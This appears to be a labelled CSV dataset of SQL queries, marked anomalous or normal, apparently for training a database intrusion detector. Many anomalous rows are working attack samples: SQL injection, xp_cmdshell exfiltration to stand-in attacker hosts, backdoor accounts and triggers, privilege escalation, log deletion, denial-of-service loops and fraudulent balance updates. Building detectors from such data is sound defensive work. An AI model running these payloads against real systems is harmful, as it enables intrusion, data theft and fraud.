+"SELECT * FROM accounts WHERE account_id = 1 AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users), 1, 1)) > 100",anormaly,0
+SELECT * FROM orders WHERE order_id = 1; WAITFOR DELAY '00:00:10'; --,anormaly,0
+SELECT * FROM products WHERE id = 1; EXEC xp_cmdshell 'nslookup data.attacker.com',anormaly,0
+"INSERT INTO comments (user_id, comment) VALUES (1, 'admin' + CHAR(124) + (SELECT password FROM users WHERE username='admin'))",anormaly,0
+SELECT * FROM users/* bypass */WHERE username = 'admin' --,anormaly,0
+SELECT * FROM products WHERE id = 1; EXEC('UPDATE users SET is_admin = 1 WHERE username = ''attacker'''),anormaly,0
+SELECT * FROM users WHERE username = 0x61646D696E27 OR 1=1--,anormaly,0
+SELECT * FROM users WHERE username = 'admin' AND password = 'password123',anormaly,0
+"SELECT * FROM users WHERE username = 'admin' AND password = 'admin'
+SELECT * FROM users WHERE username = 'admin' AND password = '123456'
+SELECT * FROM users WHERE username = 'admin' AND password = 'qwerty'",anormaly,0
+"SELECT * FROM users WHERE username = 'admin' AND password = 'Winter2024!'
+SELECT * FROM users WHERE username = 'administrator' AND password = 'Winter2024!'
+SELECT * FROM users WHERE username = 'sysadmin' AND password = 'Winter2024!'",anormaly,0
+SELECT * FROM employees WHERE username = '*)(objectClass=*))(|(uid=*,anormaly,0
+"SELECT * FROM users WHERE username = ''' AND 1=CONVERT(int, (SELECT password FROM users WHERE username='admin')) --",anormaly,0
+UPDATE users SET api_token = 'attacker_token' WHERE username = 'admin',anormaly,0
+UPDATE password_resets SET token = 'hacked' WHERE user_id = 1,anormaly,0
+UPDATE sessions SET session_id = 'hijacked_session' WHERE user_id = 1,anormaly,0
+"INSERT INTO logins (username, password_hash) VALUES ('attacker', (SELECT password_hash FROM users WHERE username='admin'))",anormaly,0
+SELECT * FROM users WHERE username = 'admin' AND password_hash = '0x5F4DCC3B5AA765D61D8327DEB882CF99',anormaly,0
+"UPDATE users SET role = 'admin', is_superuser = 1 WHERE username = 'attacker'",anormaly,0
+"EXEC sp_addsrvrolemember 'attacker_user', 'sysadmin'",anormaly,0
+"CREATE LOGIN backdoor WITH PASSWORD = 'Pa$$w0rd123!'
+EXEC sp_addsrvrolemember 'backdoor', 'sysadmin'",anormaly,0
+"CREATE PROCEDURE usp_legitProcedure
+AS
+BEGIN
+    -- Legitimate code
+    EXEC sp_addsrvrolemember 'hacker', 'db_owner'
+END
+",anormaly,0
+"CREATE TRIGGER trg_backdoor
+ON users AFTER INSERT
+AS
+BEGIN
+    EXECUTE AS USER = 'dbo'
+    INSERT INTO admin_users SELECT * FROM inserted WHERE username = 'attacker'
+END",anormaly,0
+ALTER AUTHORIZATION ON DATABASE::ProductionDB TO [attacker_user],anormaly,0
+ALTER ROLE db_owner ADD MEMBER public,anormaly,0
+"EXECUTE AS LOGIN = 'sa'
+SELECT * FROM sensitive_data",anormaly,0
+"BACKUP CERTIFICATE master_cert TO FILE = 'C:\temp\cert.cer'
+WITH PRIVATE KEY (FILE = 'C:\temp\key.pvk', ENCRYPTION BY PASSWORD = 'hack')",anormaly,0
+"EXEC sp_procoption @ProcName = 'usp_backdoor', @OptionName = 'startup', @OptionValue = 'true'",anormaly,0
+SELECT * FROM customers WHERE 1=1,anormaly,0
+"SELECT credit_card_number, ssn, dob FROM users ORDER BY id",anormaly,0
+"SELECT column_name FROM information_schema.columns 
+WHERE column_name LIKE '%ssn%' OR column_name LIKE '%credit%' OR column_name LIKE '%password%'",anormaly,0
+"SELECT patient_id, diagnosis, treatment, insurance_id FROM medical_records",anormaly,0
+"SELECT customer_id, SUM(transaction_amount), AVG(balance) 
+FROM financial_transactions 
+GROUP BY customer_id",anormaly,0
+SELECT * FROM employee_salaries WHERE salary > 100000,anormaly,0
+"SELECT u.username, p.credit_card, a.ssn 
+FROM users u 
+JOIN payments p ON u.id = p.user_id
+JOIN applications a ON u.id = a.user_id",anormaly,0
+"SELECT t.name AS table_name, c.name AS column_name
+FROM sys.tables t
+JOIN sys.columns c ON t.object_id = c.object_id
+WHERE c.name LIKE '%secret%' OR c.name LIKE '%confidential%'",anormaly,0
+"SELECT encrypted_data, encryption_key_id FROM secure_messages",anormaly,0
+SELECT TOP 1000 * FROM customers WHERE customer_id % 100 = 0,anormaly,0
+SELECT * INTO OUTFILE 'C:\temp\export.csv' FROM customers,anormaly,0
+EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.sensitive_table" queryout "C:\export\data.txt" -T -c',anormaly,0
+BACKUP DATABASE CustomerDB TO DISK = 'C:\temp\backup.bak' WITH COMPRESSION,anormaly,0
+"SELECT * FROM employees FOR XML AUTO, ELEMENTS, ROOT('Employees')",anormaly,0
+"SELECT * FROM credit_cards FOR JSON PATH, ROOT('CreditCards')",anormaly,0
+"INSERT INTO OPENQUERY(LINKED_SERVER, 'SELECT * FROM remote_table')
+SELECT * FROM local_sensitive_table",anormaly,0
+"EXEC msdb.dbo.sp_send_dbmail
+    @recipients = 'attacker@example.com',
+    @query = 'SELECT * FROM confidential_data',
+    @attach_query_result_as_file = 1",anormaly,0
+EXEC xp_cmdshell 'echo SELECT * FROM users > export.sql && ftp -s:ftp_commands.txt',anormaly,0
+#NAME?,anormaly,0
+"CREATE TABLE staging_export AS SELECT * FROM sensitive_data
+EXEC xp_cmdshell 'copy C:\db\staging_export.* \\attacker-server\share\'",anormaly,0
+UPDATE products SET price = price * RAND() WHERE product_id BETWEEN 1 AND 1000,anormaly,0
+"DELETE FROM audit_logs WHERE timestamp > DATEADD(month, -1, GETDATE())",anormaly,0
+UPDATE transactions SET amount = amount * -1 WHERE transaction_type = 'credit',anormaly,0
+"UPDATE orders SET order_date = DATEADD(year, -1, order_date) WHERE order_id > 10000",anormaly,0
+UPDATE customers SET id = id + 10000 WHERE id < 100,anormaly,0
+UPDATE users SET email = CAST(ssn AS VARCHAR) WHERE user_id < 50,anormaly,0
+UPDATE inventory SET quantity = 9999 WHERE product_id = 123,anormaly,0
+UPDATE bank_accounts SET balance = balance + 10000 WHERE account_owner = 'attacker',anormaly,0
+"TRUNCATE TABLE security_logs
+DBCC SHRINKFILE (security_log, 1)",anormaly,0
+"BEGIN TRANSACTION
+    UPDATE account_balances SET balance = balance - 1000 WHERE account_id = 1
+    UPDATE account_balances SET balance = balance + 1000 WHERE account_id = 2
+-- Note: No COMMIT, leaving transaction open",anormaly,0
+"WITH RecursiveCTE AS (
+    SELECT 1 AS n
+    UNION ALL
+    SELECT n + 1 FROM RecursiveCTE
+)
+SELECT * FROM RecursiveCTE OPTION (MAXRECURSION 0)",anormaly,0
+"SELECT * FROM table1, table2, table3, table4, table5",anormaly,0
+"DECLARE @i INT = 0
+WHILE @i < 10000
+BEGIN
+    EXEC('CREATE TABLE fill_disk_' + CAST(@i AS VARCHAR) + ' (col1 CHAR(8000))')
+    INSERT INTO fill_disk VALUES (REPLICATE('X', 8000))
+    SET @i = @i + 1
+END",anormaly,0
+"BEGIN TRANSACTION
+    UPDATE large_table SET col1 = NEWID()
+    -- No COMMIT or ROLLBACK",anormaly,0
+"DECLARE @conn INT = 0
+WHILE @conn < 1000
+BEGIN
+    EXEC sp_executesql 'SELECT 1'
+    SET @conn = @conn + 1
+END",anormaly,0
+"BEGIN TRANSACTION
+    UPDATE customers WITH (TABLOCKX) SET status = 'inactive' WHERE 1=1
+    WAITFOR DELAY '00:10:00'",anormaly,0
+"SELECT * INTO #temp FROM sys.all_objects a, sys.all_objects b, sys.all_objects c",anormaly,0
+"-- Session 1:
+BEGIN TRANSACTION
+    UPDATE accounts SET balance = balance - 100 WHERE id = 1
+    WAITFOR DELAY '00:00:05'
+    UPDATE accounts SET balance = balance + 100 WHERE id = 2",anormaly,0
+UPDATE huge_table SET indexed_column = indexed_column + 1 WHERE 1=1,anormaly,0
+"UPDATE STATISTICS customers WITH ROWCOUNT = 1000000000, PAGECOUNT = 1000000",anormaly,0
+"SELECT * FROM orders WHERE order_date > '2024-01-01' ORDER BY customer_id, amount DESC",anormaly,0
+"EXEC sp_executesql N'SELECT * FROM orders WHERE customer_id = @id', N'@id INT', @id = 1",anormaly,0
+"SELECT * FROM large_table l
+INNER LOOP JOIN huge_table h ON l.id = h.id
+WHERE l.value < 100",anormaly,0
+"SELECT * FROM products 
+WHERE price > (SELECT AVG(price) FROM products)
+AND category IN (SELECT category FROM categories WHERE active = 1)
+AND supplier_id IN (SELECT supplier_id FROM suppliers WHERE rating > 4)",anormaly,0
+SELECT * FROM users WHERE YEAR(created_date) = 2024 AND MONTH(created_date) = 1,anormaly,0
+SELECT * FROM transactions WHERE transaction_id = '12345' -- transaction_id is INT,anormaly,0
+"DECLARE @sql NVARCHAR(MAX)
+SET @sql = 'SELECT * FROM ' + QUOTENAME(@tableName)
+EXEC sp_executesql @sql",anormaly,0
+"SELECT * FROM orders o
+CROSS APPLY dbo.udf_GetOrderDetails(o.order_id) od",anormaly,0
+"SELECT * FROM large_table
+OPTION (MAXDOP 0, QUERYTRACEON 8649)",anormaly,0
+"SELECT * FROM products WITH (INDEX(0))
+WHERE price BETWEEN 100 AND 200",anormaly,0
+ALTER AUTHORIZATION ON DATABASE::ProductionDB TO [public],anormaly,0
+GRANT CONTROL SERVER TO [guest],anormaly,0
+ALTER TABLE financial_transactions DROP COLUMN audit_trail,anormaly,0
+"ALTER DATABASE ProductionDB SET TRUSTWORTHY ON
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE",anormaly,0
+ALTER DATABASE ProductionDB SET RECOVERY SIMPLE,anormaly,0
+ALTER TABLE users DROP CONSTRAINT chk_password_complexity,anormaly,0
+DROP INDEX idx_customer_email ON customers,anormaly,0
+ALTER TABLE logs ALTER COLUMN message VARCHAR(10),anormaly,0
+ALTER TABLE orders DROP CONSTRAINT fk_orders_customers,anormaly,0
+"ALTER TABLE payments ALTER COLUMN amount DECIMAL(18,2) NULL",anormaly,0
+"UPDATE transactions SET amount = ROUND(amount, 2)
+INSERT INTO audit_account (amount) VALUES (amount - ROUND(amount, 2))",anormaly,0
+"INSERT INTO transactions (account_id, amount, type) 
+VALUES (123, -10000, 'transfer')",anormaly,0
+"INSERT INTO processed_payments (payment_id, amount)
+SELECT payment_id, amount FROM payments WHERE status = 'pending'
+UNION ALL
+SELECT payment_id, amount FROM payments WHERE status = 'pending'",anormaly,0
+"-- T1: Check balance
+SELECT balance FROM accounts WHERE account_id = 123
+-- T1: If balance > amount, process withdrawal
+UPDATE accounts SET balance = balance - 1000 WHERE account_id = 123",anormaly,0
+UPDATE currency_rates SET rate = rate * 0.99 WHERE currency = 'USD',anormaly,0
+"UPDATE savings_accounts 
+SET balance = balance * (1 + interest_rate/365) 
+WHERE account_id IN (SELECT account_id FROM attacker_accounts)",anormaly,0
+"INSERT INTO refunds (transaction_id, amount, reason)
+SELECT transaction_id, amount, 'fraud' 
+FROM transactions 
+WHERE customer_id = 456",anormaly,0
+"UPDATE loan_payments SET status = 'paid'
+WHERE due_date = '2024-01-15'
+AND payment_amount > (SELECT approved_amount FROM loans WHERE loan_id = payments.loan_id)",anormaly,0
+"UPDATE invoices SET tax_amount = 0 
+WHERE customer_type = 'internal' 
+AND total_amount > 10000",anormaly,0
+"UPDATE sales SET commission_rate = 
+    CASE WHEN salesperson_id = 999 THEN 0.5 
+    ELSE 0.1 
+    END
+WHERE sale_date = '2024-01-15'",anormaly,0
+UPDATE shopping_cart SET price = 0.01 WHERE product_id = 999,anormaly,0
+UPDATE order_items SET quantity = 999999 WHERE order_id = 12345,anormaly,0
+"INSERT INTO applied_coupons (order_id, coupon_code)
+VALUES (456, 'SAVE50'), (457, 'SAVE50'), (458, 'SAVE50')",anormaly,0
+"UPDATE user_points SET points = points + 10000 
+WHERE user_id = 789 
+AND last_updated < DATEADD(minute, -5, GETDATE())",anormaly,0
+"UPDATE users SET birth_date = DATEADD(year, -21, GETDATE()) 
+WHERE user_id = 555 
+AND account_type = 'restricted'",anormaly,0
+"INSERT INTO reservations (product_id, quantity, expires_at)
+VALUES (888, 1000, DATEADD(year, 1, GETDATE()))",anormaly,0
+"UPDATE user_sessions SET expires_at = DATEADD(year, 1, GETDATE())
+WHERE session_token = 'stolen_token'",anormaly,0
+"UPDATE user_profiles SET country = 'US' 
+WHERE user_id = 777 
+AND original_country = 'restricted_country'",anormaly,0
+"INSERT INTO api_requests (user_id, endpoint, timestamp)
+SELECT 999, '/api/transfer', GETDATE() FROM generate_series(1, 1000)",anormaly,0
+"UPDATE orders SET status = 'shipped', payment_status = 'pending'
+WHERE order_id = 8888",anormaly,0
+"SELECT user_id, username, email FROM users 
+WHERE username = 'johndoe' AND password_hash = '0x5F4DCC3B5AA765D61D8327DEB882CF99'",normaly,1
+"UPDATE users SET password_hash = NEWID(), last_password_change = GETDATE()
+WHERE user_id = 123",normaly,1
+"INSERT INTO user_sessions (user_id, session_token, created_at, expires_at)
+VALUES (123, NEWID(), GETDATE(), DATEADD(hour, 1, GETDATE()))
+
+-- Example 4: Failed login attempt (wrong password)
+SELECT user_id FROM users 
+WHERE username = 'johndoe' AND password_hash = 'wrong_hash'
+
+-- Example 5: Account lockout after multiple failures
+UPDATE users SET login_attempts = login_attempts + 1
+WHERE username = 'johndoe'",normaly,1
+"SELECT first_name, last_name, email, phone 
+FROM customers 
+WHERE customer_id = 456",normaly,1
+"SELECT product_id, name, price, category 
+FROM products 
+WHERE category = 'electronics' 
+AND price BETWEEN 100 AND 500
+ORDER BY name
+OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY",normaly,1
+"SELECT order_id, order_date, total_amount, status 
+FROM orders 
+WHERE customer_id = 789 
+AND order_date > DATEADD(month, -6, GETDATE())
+ORDER BY order_date DESC",normaly,1
+"SELECT product_id, quantity, reorder_level 
+FROM inventory 
+WHERE warehouse_id = 1 
+AND quantity < reorder_level",normaly,1
+"SELECT product_id, SUM(quantity) as total_sold, SUM(amount) as revenue
+FROM sales 
+WHERE sale_date BETWEEN '2024-01-01' AND '2024-01-31'
+GROUP BY product_id
+ORDER BY revenue DESC",normaly,1
+"INSERT INTO customers (first_name, last_name, email, phone, created_at)
+VALUES ('Jane', 'Smith', 'jane@example.com', '555-1234', GETDATE())",normaly,1
+"BEGIN TRANSACTION
+    INSERT INTO orders (customer_id, order_date, total_amount, status)
+    VALUES (123, GETDATE(), 199.99, 'pending')
+    
+    INSERT INTO order_items (order_id, product_id, quantity, price)
+    VALUES (SCOPE_IDENTITY(), 456, 2, 99.99)
+COMMIT TRANSACTION",normaly,1
+"UPDATE products SET price = 129.99, last_updated = GETDATE()
+WHERE product_id = 789 AND category = 'electronics'",normaly,1
+"UPDATE customers SET phone = '555-5678', updated_at = GETDATE()
+WHERE customer_id = 123 AND email = 'john@example.com'",normaly,1
+"UPDATE users SET is_active = 0, deactivated_at = GETDATE()
+WHERE last_login < DATEADD(year, -1, GETDATE())",normaly,1
+"BACKUP DATABASE ProductionDB TO DISK = 'D:\Backups\Prod_20240115.bak'
+WITH COMPRESSION, CHECKSUM",normaly,1
+"ALTER INDEX idx_customer_email ON customers REBUILD
+WITH (ONLINE = ON, MAXDOP = 4)",normaly,1
+"UPDATE STATISTICS sales WITH FULLSCAN, ALL",normaly,1
+"GRANT SELECT, INSERT, UPDATE ON orders TO sales_team",normaly,1
+"DBCC CHECKDB ('ProductionDB') WITH ALL_ERRORMSGS, NO_INFOMSGS",normaly,1
+"UPDATE inventory SET quantity = quantity - s.quantity
+FROM sales s
+WHERE inventory.product_id = s.product_id
+AND s.sale_date = CONVERT(date, GETDATE())",normaly,1
+"INSERT INTO invoices (customer_id, amount, due_date, status)
+SELECT customer_id, SUM(amount), DATEADD(day, 30, GETDATE()), 'pending'
+FROM monthly_usage
+WHERE month = MONTH(GETDATE())
+GROUP BY customer_id",normaly,1
+"BEGIN TRANSACTION
+    UPDATE accounts SET balance = balance - 100
+    WHERE account_id = 123
+    
+    INSERT INTO transactions (from_account, to_account, amount, type)
+    VALUES (123, 456, 100, 'transfer')
+    
+    UPDATE accounts SET balance = balance + 100
+    WHERE account_id = 456
+COMMIT TRANSACTION",normaly,1
+"INSERT INTO purchase_orders (supplier_id, product_id, quantity, unit_price)
+SELECT supplier_id, product_id, reorder_quantity, current_price
+FROM inventory
+WHERE quantity < minimum_stock",normaly,1
+"INSERT INTO notifications (user_id, type, message, sent_at)
+SELECT user_id, 'promotional', 'New sale starting tomorrow!', GETDATE()
+FROM users
+WHERE marketing_opt_in = 1
+AND last_purchase_date > DATEADD(month, -3, GETDATE())",normaly,1
+"INSERT INTO security_log (user_id, action, ip_address, timestamp)
+VALUES (123, 'login_success', '192.168.1.100', GETDATE())",normaly,1
+"INSERT INTO audit_trail (table_name, record_id, action, old_value, new_value, changed_by, changed_at)
+SELECT 'customers', 123, 'UPDATE', 
+    'phone=555-1234', 'phone=555-5678', 
+    CURRENT_USER, GETDATE()",normaly,1
+"INSERT INTO error_log (error_number, error_message, procedure_name, line_number, timestamp)
+VALUES (50000, 'Invalid parameter value', 'usp_ProcessOrder', 45, GETDATE())",normaly,1
+"INSERT INTO performance_log (query_hash, duration_ms, cpu_time, logical_reads, execution_count, timestamp)
+VALUES (0x1A2B3C4D, 150, 120, 500, 1, GETDATE())",normaly,1
+"DELETE FROM security_log 
+WHERE timestamp < DATEADD(year, -1, GETDATE())",normaly,1
+"SELECT user_id, expires_at 
+FROM api_tokens 
+WHERE token = 'valid_token_123'
+AND expires_at > GETDATE()",normaly,1
+"UPDATE product_cache 
+SET data = (SELECT * FROM products FOR JSON PATH),
+    updated_at = GETDATE()
+WHERE cache_key = 'all_products'",normaly,1
+"UPDATE message_queue 
+SET status = 'processing', started_at = GETDATE()
+WHERE message_id = 999
+AND status = 'pending'",normaly,1
+"SELECT COUNT(*) as request_count
+FROM api_requests 
+WHERE user_id = 123 
+AND timestamp > DATEADD(minute, -1, GETDATE())",normaly,1
+"SELECT config_key, config_value 
+FROM application_config 
+WHERE environment = 'production'",normaly,1
+"SELECT CONVERT(date, sale_date) as sale_date,
+       COUNT(*) as transaction_count,
+       SUM(amount) as total_revenue,
+       AVG(amount) as average_order_value
+FROM sales
+WHERE sale_date >= DATEADD(day, -7, GETDATE())
+GROUP BY CONVERT(date, sale_date)
+ORDER BY sale_date DESC",normaly,1
+"SELECT 
+    CASE 
+        WHEN total_purchases > 1000 THEN 'VIP'
+        WHEN total_purchases > 500 THEN 'Premium'
+        WHEN total_purchases > 100 THEN 'Regular'
+        ELSE 'New'
+    END as segment,
+    COUNT(*) as customer_count,
+    AVG(total_purchases) as avg_spend
+FROM customer_summary
+GROUP BY 
+    CASE 
+        WHEN total_purchases > 1000 THEN 'VIP'
+        WHEN total_purchases > 500 THEN 'Premium'
+        WHEN total_purchases > 100 THEN 'Regular'
+        ELSE 'New'
+    END",normaly,1
+"SELECT p.product_id, p.name, 
+       SUM(s.quantity) as units_sold,
+       AVG(i.quantity) as avg_inventory,
+       (SUM(s.quantity) / NULLIF(AVG(i.quantity), 0)) as turnover_rate
+FROM products p
+JOIN sales s ON p.product_id = s.product_id
+JOIN inventory i ON p.product_id = i.product_id
+WHERE s.sale_date >= DATEADD(month, -3, GETDATE())
+GROUP BY p.product_id, p.name
+HAVING AVG(i.quantity) > 0",normaly,1
+"SELECT CONVERT(date, visit_time) as visit_date,
+       COUNT(DISTINCT session_id) as unique_sessions,
+       COUNT(*) as page_views,
+       AVG(time_on_page) as avg_time_on_page
+FROM website_analytics
+WHERE visit_time >= DATEADD(day, -30, GETDATE())
+GROUP BY CONVERT(date, visit_time)
+ORDER BY visit_date DESC",normaly,1
+"SELECT e.employee_id, e.first_name, e.last_name,
+       COUNT(o.order_id) as orders_processed,
+       SUM(o.total_amount) as total_sales,
+       AVG(o.customer_rating) as avg_rating
+FROM employees e
+LEFT JOIN orders o ON e.employee_id = o.assigned_to
+WHERE o.order_date >= DATEADD(month, -1, GETDATE())
+GROUP BY e.employee_id, e.first_name, e.last_name
+ORDER BY total_sales DESC",normaly,1
+"DELETE FROM temp_sessions 
+WHERE created_at < DATEADD(hour, -24, GETDATE())",normaly,1
+"INSERT INTO orders_archive
+SELECT * FROM orders 
+WHERE order_date < DATEADD(year, -2, GETDATE())
+
+DELETE FROM orders 
+WHERE order_date < DATEADD(year, -2, GETDATE())",normaly,1
+"UPDATE currency_rates 
+SET rate = new_rate, updated_at = GETDATE()
+FROM external_exchange_rates e
+WHERE currency_rates.currency_code = e.currency_code",normaly,1
+EXEC sp_refreshview 'v_sales_summary',normaly,1
+"INSERT INTO product_search_index (product_id, search_text)
+SELECT product_id, name + ' ' + description + ' ' + category
+FROM products
+WHERE last_updated > DATEADD(day, -1, GETDATE())",normaly,1
+"INSERT INTO products (name, category, price, supplier_id)
+SELECT product_name, category, unit_price, supplier_code
+FROM external_product_feed
+WHERE import_date = CONVERT(date, GETDATE())",normaly,1
+"UPDATE staging_customers
+SET email = LOWER(TRIM(email)),
+    phone = REPLACE(REPLACE(REPLACE(phone, '(', ''), ')', ''), '-', ''),
+    processed_at = GETDATE()
+WHERE processed_at IS NULL",normaly,1
+"UPDATE data_quality_log
+SET status = 'failed',
+    error_message = 'Invalid email format'
+FROM staging_customers s
+WHERE data_quality_log.record_id = s.customer_id
+AND s.email NOT LIKE '%@%.%'",normaly,1
+"UPDATE etl_batches
+SET status = 'completed',
+    end_time = GETDATE(),
+    records_processed = @@ROWCOUNT
+WHERE batch_id = 12345
+AND status = 'processing'",normaly,1
+"INSERT INTO etl_errors (batch_id, table_name, error_message, error_data)
+VALUES (12345, 'customers', 
+        'Duplicate key violation', 
+        '{""customer_id"": 456, ""email"": ""duplicate@example.com""}')",normaly,1
+CREATE USER 'backdoor' IDENTIFIED BY 'secret'; GRANT ADMIN TO 'backdoor',anormaly,0
+ALTER USER 'dbuser' WITH SUPERUSER,anormaly,0
+EXECUTE IMMEDIATE 'CREATE ROLE admin_role WITH SUPERUSER',anormaly,0
+UPDATE pg_authid SET rolcatupdate = true WHERE rolname = 'attacker',anormaly,0
+"INSERT INTO sysusers (name, roles) VALUES ('intruder', 'sysadmin')",anormaly,0
+SET ROLE dba; SELECT * FROM system_tables,anormaly,0
+CREATE PROCEDURE backdoor_proc AS EXEC('xp_cmdshell ''net localgroup administrators hacker /add'''),anormaly,0
+GRANT SELECT ON sys.sysprocesses TO 'lowpriv',anormaly,0
+ALTER TABLE users ADD COLUMN backdoor_access BOOLEAN DEFAULT TRUE,anormaly,0
+SELECT ssn FROM employees WHERE id > 0,anormaly,0
+SELECT * FROM staff WHERE shift = 'evening',normaly,1
+"INSERT INTO shifts (staff_id, date) VALUES (70, '2026-01-07')",normaly,1
+SELECT COUNT(*) FROM tables WHERE occupied = FALSE,normaly,1
+UPDATE inventory SET quantity = quantity + 50 WHERE item = 'Flour',normaly,1
+DELETE FROM expired_items WHERE expiry < CURRENT_DATE,normaly,1
+SELECT AVG(rating) FROM reviews GROUP BY order_id,normaly,1
+"INSERT INTO suppliers (name, contact) VALUES ('VendorX', 'vendor@x.com')",normaly,1
+SELECT * FROM purchases JOIN suppliers ON purchases.supplier_id = suppliers.id,normaly,1
+UPDATE bills SET paid = TRUE WHERE id = 230,normaly,1
+DELETE FROM old_orders WHERE date < '2025-01-01',normaly,1
+SELECT MAX(total) FROM bills,normaly,1
+"INSERT INTO promotions (code, discount) VALUES ('JAN10', 10)",normaly,1
+SELECT * FROM logs WHERE event = 'order_placed' ORDER BY time,normaly,1
+UPDATE reservations SET confirmed = TRUE WHERE id = 240,normaly,1
+DELETE FROM cancellations WHERE processed = TRUE,normaly,1
+SELECT DISTINCT category FROM menu_items,normaly,1
+"INSERT INTO audits (action, time) VALUES ('update_menu', NOW())",normaly,1
+SELECT * FROM finances WHERE type = 'income',normaly,1
+UPDATE staff SET salary = salary * 1.05 WHERE id = 70,normaly,1
+DELETE FROM archived_logs WHERE date < '2024-01-01',normaly,1
+SELECT COUNT(DISTINCT customer_id) FROM orders,normaly,1
+SELECT title FROM books WHERE author = 'Doe',normaly,1
+"INSERT INTO library (book_id, borrower) VALUES (300, 130)",normaly,1
+UPDATE books SET available = FALSE WHERE id = 300,normaly,1
+DELETE FROM overdue_fines WHERE paid = TRUE,normaly,1
+SELECT * FROM borrowers WHERE membership_active = TRUE,normaly,1
+"INSERT INTO fines (borrower_id, amount) VALUES (130, 5.00)",normaly,1
+SELECT SUM(fines) FROM overdue GROUP BY borrower_id,normaly,1
+UPDATE borrowers SET membership_renewed = CURRENT_DATE WHERE id = 130,normaly,1
+DELETE FROM returned_books WHERE return_date < NOW() - INTERVAL '30 DAY',normaly,1
+SELECT * FROM categories WHERE books_count > 0,normaly,1
+INSERT INTO authors (name) VALUES ('Jane Smith'),normaly,1
+SELECT COUNT(*) FROM books WHERE genre = 'Fiction',normaly,1
+UPDATE library SET due_date = due_date + INTERVAL '7 DAY' WHERE book_id = 310,normaly,1
+DELETE FROM lost_books WHERE reported < '2025-01-01',normaly,1
+SELECT AVG(rating) FROM book_reviews GROUP BY book_id,normaly,1
+"INSERT INTO reviews (book_id, score) VALUES (300, 4.5)",normaly,1
+SELECT * FROM books JOIN authors ON books.author_id = authors.id,normaly,1
+UPDATE fines SET paid = TRUE WHERE id = 250,normaly,1
+DELETE FROM inactive_members WHERE last_borrow < '2024-01-01',normaly,1
+SELECT MIN(publication_year) FROM books,normaly,1
+"INSERT INTO donations (book_name, donor) VALUES ('Old Book', 'Anonymous')",normaly,1
+SELECT * FROM logs WHERE action = 'borrow' ORDER BY date DESC,normaly,1
+UPDATE books SET rating = (SELECT AVG(score) FROM reviews WHERE book_id = books.id),normaly,1
+DELETE FROM temp_entries WHERE created < NOW() - INTERVAL '1 HOUR',normaly,1
+SELECT DISTINCT genre FROM books,normaly,1
+"INSERT INTO events (type, date) VALUES ('Book Fair', '2026-03-01')",normaly,1
+SELECT * FROM budgets WHERE category = 'Acquisitions',normaly,1
+UPDATE authors SET books_count = books_count + 1 WHERE id = 80,normaly,1
+DELETE FROM archived_records WHERE year < 2023,normaly,1
+SELECT COUNT(DISTINCT borrower_id) FROM library,normaly,1
+"INSERT INTO assets (name, value) VALUES ('Server', 5000)",normaly,1
+SELECT * FROM configurations WHERE env = 'production',normaly,1
+UPDATE orders SET delivery_date = '2026-01-10' WHERE id = 210,normaly,1
+DELETE FROM error_logs WHERE severity = 'info',normaly,1
+SELECT DISTINCT email FROM newsletter_subscribers,normaly,1
+"INSERT INTO milestones (project_id, description) VALUES (100, 'Phase 1 complete')",normaly,1
+SELECT * FROM budgets WHERE department = 'IT',normaly,1
+UPDATE employees SET vacation_days = vacation_days - 1 WHERE id = 60,normaly,1
+DELETE FROM inactive_accounts WHERE last_activity < '2024-01-01',normaly,1
+SELECT AVG(age) FROM customers GROUP BY gender,normaly,1
+"SELECT name, price FROM menu WHERE available = TRUE",normaly,1
+"INSERT INTO reservations (table_id, time) VALUES (3, '18:00')",normaly,1
+UPDATE tables SET occupied = FALSE WHERE id = 3,normaly,1
+DELETE FROM menu_items WHERE stock = 0,normaly,1
+SELECT * FROM orders WHERE customer_id = 120 LIMIT 5,normaly,1
+"INSERT INTO reviews (order_id, rating) VALUES (220, 4)",normaly,1
+SELECT SUM(total) FROM bills WHERE paid = TRUE,normaly,1
+UPDATE customers SET loyalty_points = loyalty_points + 10 WHERE id = 120,normaly,1
+DELETE FROM waitlist WHERE time < NOW(),normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SET GLOBAL max_connections = 1,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER SYSTEM SET log_level = 'none',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DROP SCHEMA public CASCADE,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER TABLE users RENAME TO hidden_users,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SET SESSION isolation_level = 'none',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER DATABASE db SET ENCRYPTION OFF,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DROP INDEX all_indexes ON critical_table,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SET GLOBAL innodb_buffer_pool_size = 1MB,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER USER 'admin' WITH PASSWORD '',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE accounts SET balance = balance + 1000000 WHERE id = 1,anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO transfers (from_acct, to_acct, amount) VALUES (999, 999, -5000)",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM invoices WHERE amount > 0,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM ledgers WHERE debit = credit * -1,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE expenses SET category = 'fraud' WHERE approval = 'pending',anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO payments (card, amount) VALUES ('stolen_card', 99999)",anormaly,0
